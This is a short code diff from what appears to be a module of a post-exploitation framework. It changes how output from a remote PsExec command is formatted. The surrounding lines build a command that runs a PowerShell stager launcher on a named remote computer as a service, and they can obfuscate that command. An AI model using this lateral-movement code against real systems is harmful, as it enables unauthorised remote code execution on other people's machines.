@@ -75,9 +75,8 @@ class Module(object):
                     stager_cmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
                     script_end += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computer_name, service_name, stager_cmd)
 
-
-        script_end += "| Out-String | %{$_ + \"`n\"};"
-
+        outputf = params.get("OutputFunction", "Out-String")
+        script_end += f" | {outputf} | " + '%{$_ + \"`n\"};"`n' + str(module.name.split("/")[-1]) + ' completed!"'
         if obfuscate:
             script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
         script += script_end
